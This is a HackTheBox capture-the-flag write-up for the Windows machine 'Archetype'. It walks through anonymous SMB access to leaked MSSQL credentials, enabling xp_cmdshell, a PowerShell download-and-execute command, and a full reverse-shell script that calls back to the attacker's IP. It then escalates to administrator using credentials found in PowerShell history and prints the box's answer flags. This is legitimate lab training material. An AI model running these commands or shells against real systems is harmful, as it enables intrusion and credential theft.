---
Category:
  - B2R
Difficulty: Easy
Platform: HackTheBox
Status: 3. Complete
tags: [MSSQL, Windows, credentials-in-history, insecure-credentials, xp_cmdshell, anonymous-smb]
---
# Resolution summary

- **Anonymous SMB** access allowed to discover a readable backups folder containing **MSSQL credentials**
- Using leaked credentials it was possible to obtain an high privileged access to **MSSQL** and to enable the **xp_cmdshell**
- Inspecting the **powershell history** of the **sql_svc** user it was possible to discover **hardcoded administrator credentials**

---

# Information Gathering

Scanned all TCP ports:

```bash
┌──(kali㉿kali)-[~/YT/SP/27]
└─$ sudo nmap -sS -p- 10.10.10.27 -v -oN scans/all-tcp-ports.txt
...
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
```

Enumerated open TCP ports:

```bash
┌──(kali㉿kali)-[~/YT/SP/27]
└─$ nmap -sT -sC -sV -p 135,139,445,1433 -oN scans/open-tcp-ports.txt 10.10.10.27
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-16 17:08 EDT
Nmap scan report for 10.10.10.27
Host is up (0.041s latency).

PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info:
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-06-16T20:20:16
|_Not valid after:  2051-06-16T20:20:16
|_ssl-date: 2021-06-16T21:27:02+00:00; +18m23s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h42m24s, deviation: 3h07m51s, median: 18m23s
| ms-sql-info:
|   10.10.10.27:1433:
|     Version:
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-os-discovery:
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-06-16T14:26:57-07:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-06-16T21:26:54
|_  start_date: N/A
```

# Enumeration

## Port 445 - SMB

Enumerated shared folders using null session:

```bash
┌──(kali㉿kali)-[~/YT/SP/27]
└─$ smbmap -H 10.10.10.27 -u ' ' -p ' '
[+] Guest session       IP: 10.10.10.27:445     Name: 10.10.10.27
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        backups                                                 READ ONLY
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
```

Leaked MSSQL credentials:

```bash
┌──(kali㉿kali)-[~/YT/SP/27]
└─$ smbclient //10.10.10.27/backups
Enter WORKGROUP\kali's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020

                10328063 blocks of size 4096. 8207732 blocks available
smb: \> get prod.dtsConfig
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (3.5 KiloBytes/sec) (average 3.5 KiloBytes/sec)
smb: \> exit

┌──(kali㉿kali)-[~/YT/SP/27]
└─$ cat prod.dtsConfig
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

## Port 1433 - MSSQL

>[!important]
>Credentials discovered from SMB: ARCHETYPE\sql_svc:M3g4c0rp123

Accessed MS-SQL and activated xp_cmdshell:

```bash
┌──(kali㉿kali)-[~/YT/SP/27]
└─$ mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.10.10.27 -windows-auth
/home/kali/.pyenv/versions/2.7.18/lib/python2.7/site-packages/OpenSSL/crypto.py:14: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography import utils, x509
Impacket v0.9.16-dev - Copyright 2002-2017 Core Security Technologies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands
SQL> select @@version
                                                                                                                                                                                                                                           

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64)
        Aug 22 2017 17:04:49
        Copyright (C) 2017 Microsoft Corporation
        Standard Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)

SQL> Select system_user

--------------------------------------------------------------------------------------------------------------------------------

ARCHETYPE\sql_svc
SQL> select db_name()

--------------------------------------------------------------------------------------------------------------------------------

master
SQL> select name from master.dbo.sysdatabase;
[-] ERROR(ARCHETYPE): Line 1: Invalid object name 'master.dbo.sysdatabase'.
SQL> select name from master.dbo.sysdatabase;
[-] ERROR(ARCHETYPE): Line 1: Invalid object name 'master.dbo.sysdatabase'.
SQL> select name from master.dbo.sysdatabases;
name

--------------------------------------------------------------------------------------------------------------------------------

master
tempdb
model
msdb
SQL>
SQL> select is_servrolemember("systemadmin")
[-] ERROR(ARCHETYPE): Line 1: 'is_servrolemember' is not a recognized built-in function name.
SQL> select is_srvrolemember("systemadmin")
[-] ERROR(ARCHETYPE): Line 1: Invalid column name 'systemadmin'.
SQL> select is_srvrolemember("systemadmin");
[-] ERROR(ARCHETYPE): Line 1: Invalid column name 'systemadmin'.
SQL> select is_srvrolemember('systemadmin');

-----------

       NULL
SQL> select is_srvrolemember('bulkadmin');

-----------

          1
SQL> sp_configure 'show advanced options', '1'
[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL> sp_configure 'show advanced options', '1'
[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE
SQL> sp_configure 'xp_cmdshell', '1'
[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE
SQL> xp_cmdshell 'whoami'
[-] ERROR(ARCHETYPE): Line 1: Incorrect syntax near 'whoami'.
SQL> xp_cmdshell "whoami"
SQL> xp_cmdshell "whoami"
output

--------------------------------------------------------------------------------

archetype\sql_svc
NULL
SQL> xp_cmdshell "ipconfig"
output
```

# Exploitation

## xp_cmdshell code execution

Executed a reverse shell:

```sql
SQL> xp_cmdshell "powershell "IEX(New-Object Net.WebClient).downloadString(\"http://10.10.14.53/rev.ps1\")""
```

Reverse shell (rev.ps1):

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.53',10099);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
        $sendback = (iex $data 2>&1 | Out-String );
        $sendback2 = $sendback + '#' + (pwd) + '-> ';
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
        $stream.Write($sendbyte,0,$sendbyte.Length);
        $stream.Flush();
}
$client.Close();
```

Obtained the connection back:

```bash
┌──(kali㉿kali)-[~/YT/SP]
└─$ nc -nlvp 10099
listening on [any] 10099 ...
connect to [10.10.14.53] from (UNKNOWN) [10.10.10.27] 49844

#C:\windows\tasks-> whoami
archetype\sql_svc
```

# Privilege Escalation

## Users info

```bash
#C:\windows\tasks-> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
#C:\windows\tasks-> net user

User accounts for \\ARCHETYPE

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
john                     sql_svc                  WDAGUtilityAccount
```

## System info

```bash
#C:\windows\tasks-> systeminfo

Host Name:                 ARCHETYPE
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00429-00521-62775-AA442
Original Install Date:     1/19/2020, 11:39:36 PM
System Boot Time:          6/16/2021, 1:19:57 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 6/19/2019
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 737 MB
Virtual Memory: Max Size:  2,431 MB
Virtual Memory: Available: 1,165 MB
Virtual Memory: In Use:    1,266 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 2 Hotfix(s) Installed.
                           [01]: KB4532947
                           [02]: KB4464455
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.27
                                 [02]: fe80::c419:e979:cb55:4413
                                 [03]: dead:beef::c419:e979:cb55:4413
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

## Powershell history

```bash
#C:\USers\sql_svc-> Get-PSReadlineOption

EditMode                               : Windows
AddToHistoryHandler                    :
HistoryNoDuplicates                    : True
HistorySavePath                        : C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Conso
                                         leHost_history.txt
HistorySaveStyle                       : SaveIncrementally
HistorySearchCaseSensitive             : False
HistorySearchCursorMovesToEnd          : False
MaximumHistoryCount                    : 4096
ContinuationPrompt                     : >>
ExtraPromptLineCount                   : 0
PromptText                             :
BellStyle                              : Audible
DingDuration                           : 50
DingTone                               : 1221
CommandsToValidateScriptBlockArguments : {ForEach-Object, %, Invoke-Command, icm...}
CommandValidationHandler               :
CompletionQueryItems                   : 100
MaximumKillRingCount                   : 10
ShowToolTips                           : True
ViModeIndicator                        : None
WordDelimiters                         : ;:,.[]{}()/\|^&*-=+'"???
CommandColor                           : "$([char]0x1b)[93m"
CommentColor                           : "$([char]0x1b)[32m"
ContinuationPromptColor                : "$([char]0x1b)[37m"
DefaultTokenColor                      : "$([char]0x1b)[37m"
EmphasisColor                          : "$([char]0x1b)[96m"
ErrorColor                             : "$([char]0x1b)[91m"
KeywordColor                           : "$([char]0x1b)[92m"
MemberColor                            : "$([char]0x1b)[97m"
NumberColor                            : "$([char]0x1b)[97m"
OperatorColor                          : "$([char]0x1b)[90m"
ParameterColor                         : "$([char]0x1b)[90m"
SelectionColor                         : "$([char]0x1b)[30;47m"
StringColor                            : "$([char]0x1b)[36m"
TypeColor                              : "$([char]0x1b)[37m"
VariableColor                          : "$([char]0x1b)[92m"

#C:\USers\sql_svc-> type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Conso*
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

### Escalation to admin

>[!important]
>Credentials from PS history: administrator:MEGACORP_4dm1n!!

Accessing the machine using PsExec

```bash
┌──(kali㉿kali)-[~/YT/SP]
└─$ impacket-psexec archetype/administrator:'MEGACORP_4dm1n!!'@10.10.10.27
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.27.....
[*] Found writable share ADMIN$
[*] Uploading file DcqCzuMm.exe
[*] Opening SVCManager on 10.10.10.27.....
[*] Creating service CZZn on 10.10.10.27.....
[*] Starting service CZZn.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>exit
[*] Process cmd.exe finished with ErrorCode: 0, ReturnCode: 0
[*] Opening SVCManager on 10.10.10.27.....
[*] Stopping service CZZn.....
[*] Removing service CZZn.....
[*] Removing file DcqCzuMm.exe.....
```

Accessing the machine using WinRM:

```bash
┌──(kali㉿kali)-[~/YT/SP]
└─$ evil-winrm -u administrator -p 'MEGACORP_4dm1n!!' -i 10.10.10.27

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Documents> whoami
archetype\administrator
```

# Trophy
 
>[!success]
>**User.txt**
>3e7b102e78218e935bf3f4951fec21a3

>[!success]
>**Root.txt**
>b91ccec3305e98240082d4474b848528

